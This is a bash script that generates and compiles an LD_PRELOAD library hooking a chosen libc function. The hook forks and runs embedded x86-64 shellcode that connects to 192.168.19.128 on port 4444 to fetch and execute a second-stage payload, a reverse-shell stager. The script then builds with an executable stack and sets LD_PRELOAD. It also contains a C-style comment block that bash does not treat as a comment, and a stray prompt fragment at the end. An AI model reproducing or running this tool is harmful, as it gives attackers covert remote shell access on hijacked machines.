#!/bin/bash

set -e

FUNC_NAME="${1}"
OUTPUT_DIR="${2:-.}"

# --- Usage ---
if [[ -z "$FUNC_NAME" ]]; then
    echo "Usage: $0 <function_name> [output_dir]"
    echo ""
    echo "Examples:"
    echo "  $0 geteuid"
    echo "  $0 open ./build"
    echo "  $0 read /tmp/mylib"
    exit 1
fi

# --- Signature lookup table ---
# Format per key: RETURN_TYPE | PARAM_LIST | PARAM_NAMES_ONLY | EXTRA_INCLUDES
declare -A SIG_RETURN SIG_PARAMS SIG_PARAM_NAMES SIG_INCLUDES

# use below command to add signature of an unknown function
/*
FUNC=connect HEADER="<sys/socket.h>" && \
  SIG=$(echo "#include ${HEADER}" | gcc -E - | grep -oE '[a-zA-Z_][a-zA-Z0-9_ *]+\b'"${FUNC}"'\s*\([^;]+\)' | grep -v define | tail -1) && \
  RET=$(echo "$SIG" | sed "s/\b${FUNC}\b.*//;s/__attribute__.*//;s/extern //;s/^ *//;s/ *$//") && \
  PARAMS=$(echo "$SIG" | grep -oP '(?<='"${FUNC}"'\s{0,5}\().*?(?=\))' | sed 's/__restrict//g;s/  */ /g') && \
  PNAMES=$(echo "$PARAMS" | tr ',' '\n' | awk '{w=$NF; gsub(/[^a-zA-Z0-9_]/,"",w); printf "%s%s", (NR>1?", ":""), w}') && \
  echo "SIG_RETURN[${FUNC}]=\"${RET}\";  SIG_PARAMS[${FUNC}]=\"${PARAMS}\";  SIG_PARAM_NAMES[${FUNC}]=\"${PNAMES}\";  SIG_INCLUDES[${FUNC}]=\"#include ${HEADER}\""
*/

# uid/gid
SIG_RETURN[geteuid]="uid_t";   SIG_PARAMS[geteuid]="void";                                                      SIG_PARAM_NAMES[geteuid]="";                              SIG_INCLUDES[geteuid]="#include <sys/types.h>\n#include <unistd.h>"
SIG_RETURN[getuid]="uid_t";    SIG_PARAMS[getuid]="void";                                                       SIG_PARAM_NAMES[getuid]="";                               SIG_INCLUDES[getuid]="#include <sys/types.h>\n#include <unistd.h>"
SIG_RETURN[getegid]="gid_t";   SIG_PARAMS[getegid]="void";                                                      SIG_PARAM_NAMES[getegid]="";                              SIG_INCLUDES[getegid]="#include <sys/types.h>\n#include <unistd.h>"
SIG_RETURN[getgid]="gid_t";    SIG_PARAMS[getgid]="void";                                                       SIG_PARAM_NAMES[getgid]="";                               SIG_INCLUDES[getgid]="#include <sys/types.h>\n#include <unistd.h>"

# file I/O
SIG_RETURN[open]="int";        SIG_PARAMS[open]="const char *pathname, int flags, ...";                         SIG_PARAM_NAMES[open]="pathname, flags";                   SIG_INCLUDES[open]="#include <fcntl.h>\n#include <stdarg.h>"
SIG_RETURN[open64]="int";      SIG_PARAMS[open64]="const char *pathname, int flags, ...";                       SIG_PARAM_NAMES[open64]="pathname, flags";                 SIG_INCLUDES[open64]="#include <fcntl.h>\n#include <stdarg.h>"
SIG_RETURN[close]="int";       SIG_PARAMS[close]="int fd";                                                      SIG_PARAM_NAMES[close]="fd";                               SIG_INCLUDES[close]="#include <unistd.h>"
SIG_RETURN[read]="ssize_t";    SIG_PARAMS[read]="int fd, void *buf, size_t count";                              SIG_PARAM_NAMES[read]="fd, buf, count";                    SIG_INCLUDES[read]="#include <unistd.h>"
SIG_RETURN[write]="ssize_t";   SIG_PARAMS[write]="int fd, const void *buf, size_t count";                       SIG_PARAM_NAMES[write]="fd, buf, count";                   SIG_INCLUDES[write]="#include <unistd.h>"
SIG_RETURN[lseek]="off_t";     SIG_PARAMS[lseek]="int fd, off_t offset, int whence";                            SIG_PARAM_NAMES[lseek]="fd, offset, whence";               SIG_INCLUDES[lseek]="#include <unistd.h>"
SIG_RETURN[unlink]="int";      SIG_PARAMS[unlink]="const char *pathname";                                       SIG_PARAM_NAMES[unlink]="pathname";                        SIG_INCLUDES[unlink]="#include <unistd.h>"
SIG_RETURN[rename]="int";      SIG_PARAMS[rename]="const char *oldpath, const char *newpath";                   SIG_PARAM_NAMES[rename]="oldpath, newpath";                SIG_INCLUDES[rename]="#include <stdio.h>"
SIG_RETURN[mkdir]="int";       SIG_PARAMS[mkdir]="const char *pathname, mode_t mode";                           SIG_PARAM_NAMES[mkdir]="pathname, mode";                   SIG_INCLUDES[mkdir]="#include <sys/stat.h>"
SIG_RETURN[rmdir]="int";       SIG_PARAMS[rmdir]="const char *pathname";                                        SIG_PARAM_NAMES[rmdir]="pathname";                         SIG_INCLUDES[rmdir]="#include <unistd.h>"
SIG_RETURN[stat]="int";        SIG_PARAMS[stat]="const char *pathname, struct stat *statbuf";                   SIG_PARAM_NAMES[stat]="pathname, statbuf";                 SIG_INCLUDES[stat]="#include <sys/stat.h>"
SIG_RETURN[chmod]="int";       SIG_PARAMS[chmod]="const char *pathname, mode_t mode";                           SIG_PARAM_NAMES[chmod]="pathname, mode";                   SIG_INCLUDES[chmod]="#include <sys/stat.h>"
SIG_RETURN[chown]="int";       SIG_PARAMS[chown]="const char *pathname, uid_t owner, gid_t group";              SIG_PARAM_NAMES[chown]="pathname, owner, group";           SIG_INCLUDES[chown]="#include <unistd.h>"

# stdio
SIG_RETURN[fopen]="FILE*";     SIG_PARAMS[fopen]="const char *pathname, const char *mode";                      SIG_PARAM_NAMES[fopen]="pathname, mode";                   SIG_INCLUDES[fopen]="#include <stdio.h>"
SIG_RETURN[fclose]="int";      SIG_PARAMS[fclose]="FILE *stream";                                               SIG_PARAM_NAMES[fclose]="stream";                          SIG_INCLUDES[fclose]="#include <stdio.h>"
SIG_RETURN[fread]="size_t";    SIG_PARAMS[fread]="void *ptr, size_t size, size_t nmemb, FILE *stream";          SIG_PARAM_NAMES[fread]="ptr, size, nmemb, stream";         SIG_INCLUDES[fread]="#include <stdio.h>"
SIG_RETURN[fwrite]="size_t";   SIG_PARAMS[fwrite]="const void *ptr, size_t size, size_t nmemb, FILE *stream";   SIG_PARAM_NAMES[fwrite]="ptr, size, nmemb, stream";        SIG_INCLUDES[fwrite]="#include <stdio.h>"
SIG_RETURN[fputs]="int";       SIG_PARAMS[fputs]="const char *s, FILE *stream";                                 SIG_PARAM_NAMES[fputs]="s, stream";                        SIG_INCLUDES[fputs]="#include <stdio.h>"
SIG_RETURN[fgets]="char*";     SIG_PARAMS[fgets]="char *s, int size, FILE *stream";                             SIG_PARAM_NAMES[fgets]="s, size, stream";                  SIG_INCLUDES[fgets]="#include <stdio.h>"
SIG_RETURN[fseek]="int";       SIG_PARAMS[fseek]="FILE *stream, long offset, int whence";                       SIG_PARAM_NAMES[fseek]="stream, offset, whence";           SIG_INCLUDES[fseek]="#include <stdio.h>"
SIG_RETURN[ftell]="long";      SIG_PARAMS[ftell]="FILE *stream";                                                SIG_PARAM_NAMES[ftell]="stream";                           SIG_INCLUDES[ftell]="#include <stdio.h>"
SIG_RETURN[printf]="int";      SIG_PARAMS[printf]="const char *format, ...";                                    SIG_PARAM_NAMES[printf]="format";                          SIG_INCLUDES[printf]="#include <stdio.h>\n#include <stdarg.h>"

# memory
SIG_RETURN[malloc]="void*";    SIG_PARAMS[malloc]="size_t size";                                                SIG_PARAM_NAMES[malloc]="size";                            SIG_INCLUDES[malloc]="#include <stdlib.h>"
SIG_RETURN[free]="void";       SIG_PARAMS[free]="void *ptr";                                                    SIG_PARAM_NAMES[free]="ptr";                               SIG_INCLUDES[free]="#include <stdlib.h>"
SIG_RETURN[calloc]="void*";    SIG_PARAMS[calloc]="size_t nmemb, size_t size";                                  SIG_PARAM_NAMES[calloc]="nmemb, size";                     SIG_INCLUDES[calloc]="#include <stdlib.h>"
SIG_RETURN[realloc]="void*";   SIG_PARAMS[realloc]="void *ptr, size_t size";                                    SIG_PARAM_NAMES[realloc]="ptr, size";                      SIG_INCLUDES[realloc]="#include <stdlib.h>"

# process / execution
SIG_RETURN[fork]="pid_t";      SIG_PARAMS[fork]="void";                                                         SIG_PARAM_NAMES[fork]="";                                  SIG_INCLUDES[fork]="#include <sys/types.h>\n#include <unistd.h>"
SIG_RETURN[execve]="int";      SIG_PARAMS[execve]="const char *pathname, char *const argv[], char *const envp[]"; SIG_PARAM_NAMES[execve]="pathname, argv, envp";          SIG_INCLUDES[execve]="#include <unistd.h>"
SIG_RETURN[execvp]="int";      SIG_PARAMS[execvp]="const char *file, char *const argv[]";                       SIG_PARAM_NAMES[execvp]="file, argv";                      SIG_INCLUDES[execvp]="#include <unistd.h>"
SIG_RETURN[exit]="void";       SIG_PARAMS[exit]="int status";                                                   SIG_PARAM_NAMES[exit]="status";                            SIG_INCLUDES[exit]="#include <stdlib.h>"
SIG_RETURN[system]="int";      SIG_PARAMS[system]="const char *command";                                        SIG_PARAM_NAMES[system]="command";                         SIG_INCLUDES[system]="#include <stdlib.h>"
SIG_RETURN[getpid]="pid_t";    SIG_PARAMS[getpid]="void";                                                       SIG_PARAM_NAMES[getpid]="";                                SIG_INCLUDES[getpid]="#include <sys/types.h>\n#include <unistd.h>"
SIG_RETURN[getppid]="pid_t";   SIG_PARAMS[getppid]="void";                                                      SIG_PARAM_NAMES[getppid]="";                               SIG_INCLUDES[getppid]="#include <sys/types.h>\n#include <unistd.h>"

# network
SIG_RETURN[socket]="int";      SIG_PARAMS[socket]="int domain, int type, int protocol";                         SIG_PARAM_NAMES[socket]="domain, type, protocol";          SIG_INCLUDES[socket]="#include <sys/socket.h>"
SIG_RETURN[connect]="int";     SIG_PARAMS[connect]="int sockfd, const struct sockaddr *addr, socklen_t addrlen"; SIG_PARAM_NAMES[connect]="sockfd, addr, addrlen";         SIG_INCLUDES[connect]="#include <sys/socket.h>"
SIG_RETURN[bind]="int";        SIG_PARAMS[bind]="int sockfd, const struct sockaddr *addr, socklen_t addrlen";   SIG_PARAM_NAMES[bind]="sockfd, addr, addrlen";             SIG_INCLUDES[bind]="#include <sys/socket.h>"
SIG_RETURN[accept]="int";      SIG_PARAMS[accept]="int sockfd, struct sockaddr *addr, socklen_t *addrlen";      SIG_PARAM_NAMES[accept]="sockfd, addr, addrlen";           SIG_INCLUDES[accept]="#include <sys/socket.h>"
SIG_RETURN[send]="ssize_t";    SIG_PARAMS[send]="int sockfd, const void *buf, size_t len, int flags";           SIG_PARAM_NAMES[send]="sockfd, buf, len, flags";           SIG_INCLUDES[send]="#include <sys/socket.h>"
SIG_RETURN[recv]="ssize_t";    SIG_PARAMS[recv]="int sockfd, void *buf, size_t len, int flags";                 SIG_PARAM_NAMES[recv]="sockfd, buf, len, flags";           SIG_INCLUDES[recv]="#include <sys/socket.h>"
SIG_RETURN[listen]="int";      SIG_PARAMS[listen]="int sockfd, int backlog";                                    SIG_PARAM_NAMES[listen]="sockfd, backlog";                 SIG_INCLUDES[listen]="#include <sys/socket.h>"

# string
SIG_RETURN[strcmp]="int";      SIG_PARAMS[strcmp]="const char *s1, const char *s2";                             SIG_PARAM_NAMES[strcmp]="s1, s2";                          SIG_INCLUDES[strcmp]="#include <string.h>"
SIG_RETURN[strncmp]="int";     SIG_PARAMS[strncmp]="const char *s1, const char *s2, size_t n";                  SIG_PARAM_NAMES[strncmp]="s1, s2, n";                      SIG_INCLUDES[strncmp]="#include <string.h>"
SIG_RETURN[strcpy]="char*";    SIG_PARAMS[strcpy]="char *dest, const char *src";                                SIG_PARAM_NAMES[strcpy]="dest, src";                       SIG_INCLUDES[strcpy]="#include <string.h>"
SIG_RETURN[strncpy]="char*";   SIG_PARAMS[strncpy]="char *dest, const char *src, size_t n";                     SIG_PARAM_NAMES[strncpy]="dest, src, n";                   SIG_INCLUDES[strncpy]="#include <string.h>"
SIG_RETURN[strlen]="size_t";   SIG_PARAMS[strlen]="const char *s";                                              SIG_PARAM_NAMES[strlen]="s";                               SIG_INCLUDES[strlen]="#include <string.h>"
SIG_RETURN[strdup]="char*";    SIG_PARAMS[strdup]="const char *s";                                              SIG_PARAM_NAMES[strdup]="s";                               SIG_INCLUDES[strdup]="#include <string.h>"
SIG_RETURN[strcat]="char*";    SIG_PARAMS[strcat]="char *dest, const char *src";                                SIG_PARAM_NAMES[strcat]="dest, src";                       SIG_INCLUDES[strcat]="#include <string.h>"
SIG_RETURN[strchr]="char*";    SIG_PARAMS[strchr]="const char *s, int c";                                       SIG_PARAM_NAMES[strchr]="s, c";                            SIG_INCLUDES[strchr]="#include <string.h>"
SIG_RETURN[memcpy]="void*";    SIG_PARAMS[memcpy]="void *dest, const void *src, size_t n";                      SIG_PARAM_NAMES[memcpy]="dest, src, n";                    SIG_INCLUDES[memcpy]="#include <string.h>"
SIG_RETURN[memset]="void*";    SIG_PARAMS[memset]="void *s, int c, size_t n";                                   SIG_PARAM_NAMES[memset]="s, c, n";                         SIG_INCLUDES[memset]="#include <string.h>"
SIG_RETURN[memcmp]="int";      SIG_PARAMS[memcmp]="const void *s1, const void *s2, size_t n";                   SIG_PARAM_NAMES[memcmp]="s1, s2, n";                       SIG_INCLUDES[memcmp]="#include <string.h>"

# --- Resolve signature ---
RETURN_TYPE="${SIG_RETURN[$FUNC_NAME]}"
PARAMS="${SIG_PARAMS[$FUNC_NAME]}"
PARAM_NAMES="${SIG_PARAM_NAMES[$FUNC_NAME]}"
EXTRA_INCLUDES="${SIG_INCLUDES[$FUNC_NAME]}"

if [[ -z "$RETURN_TYPE" ]]; then
    echo "[!] WARNING: '$FUNC_NAME' not found in the signature table."
    echo "    Falling back to generic 'void*' signature."
    echo "    To get a correctly typed hook, add '$FUNC_NAME' to the SIG_* tables in this script."
    RETURN_TYPE="void*"
    PARAMS="void"
    PARAM_NAMES=""
    EXTRA_INCLUDES=""
fi

mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR"

echo "[+] Generating hook for: ${RETURN_TYPE} ${FUNC_NAME}(${PARAMS})"

# --- Build call and return statements depending on type / params ---
if [[ -z "$PARAM_NAMES" ]]; then
    OLD_CALL="(*old_${FUNC_NAME})()"
else
    OLD_CALL="(*old_${FUNC_NAME})(${PARAM_NAMES})"
fi

if [[ "$RETURN_TYPE" == "void" ]]; then
    RETURN_NEGATIVE_ONE=""          # nothing after mprotect failure
    RETURN_OLD_CALL="${OLD_CALL};"  # just call, no return value
    RETURN_NEGATIVE_TWO=""
    FINAL_RETURN="return;"
else
    RETURN_NEGATIVE_ONE="return (${RETURN_TYPE})-1;"
    RETURN_OLD_CALL="return ${OLD_CALL};"
    RETURN_NEGATIVE_TWO="return (${RETURN_TYPE})-2;"
    FINAL_RETURN=""
fi

# --- Write C source ---
{
cat << EOF
#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
EOF
echo -e "${EXTRA_INCLUDES}"
cat << EOF

static unsigned char buf[] = 
"\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
"\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
"\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
"\x11\x5c\xc0\xa8\x13\x80\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
"\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
"\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
"\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
"\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
"\x78\xed\xff\xe6";

${RETURN_TYPE} ${FUNC_NAME}(${PARAMS}) {
        typeof(${FUNC_NAME}) *old_${FUNC_NAME};
        old_${FUNC_NAME} = dlsym(RTLD_NEXT, "${FUNC_NAME}");
        if (fork() == 0) {
                intptr_t pagesize = sysconf(_SC_PAGESIZE);
                if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {
                        perror("mprotect");
                        ${RETURN_NEGATIVE_ONE}
                }
                int (*ret)() = (int(*)())buf;
                ret();
        } else {
                printf("[*]: Returning from function...\n");
                ${RETURN_OLD_CALL}
        }
        printf("HACK: Returning from main...\n");
        ${RETURN_NEGATIVE_TWO}
        ${FINAL_RETURN}
}
EOF
} > "${FUNC_NAME}.c"

echo "[+] ${FUNC_NAME}.c written."

# --- Compile ---
gcc -Wall -fPIC -z execstack -c -o "${FUNC_NAME}.o" "${FUNC_NAME}.c"
echo "[+] Compiled ${FUNC_NAME}.o"

gcc -shared -o "${FUNC_NAME}.so" "${FUNC_NAME}.o" -ldl
echo "[+] Linked ${FUNC_NAME}.so"

echo ""
echo "Done. Files in: $OUTPUT_DIR"
ls -lh "${FUNC_NAME}".* 2>/dev/null

# --- Set LD_PRELOAD to the absolute path of the generated .so ---
SO_ABS_PATH="$(realpath "${FUNC_NAME}.so")"
export LD_PRELOAD="${SO_ABS_PATH}"
echo ""
echo "[+] LD_PRELOAD set to: $LD_PRELOAD"
echo ""
echo "    To use in your current shell, run:"
echo "      export LD_PRELOAD=${SO_ABS_PATH}"
echo "    To unset later:"
echo "      unset LD_PRELOAD"
                                                                                                                
┌─
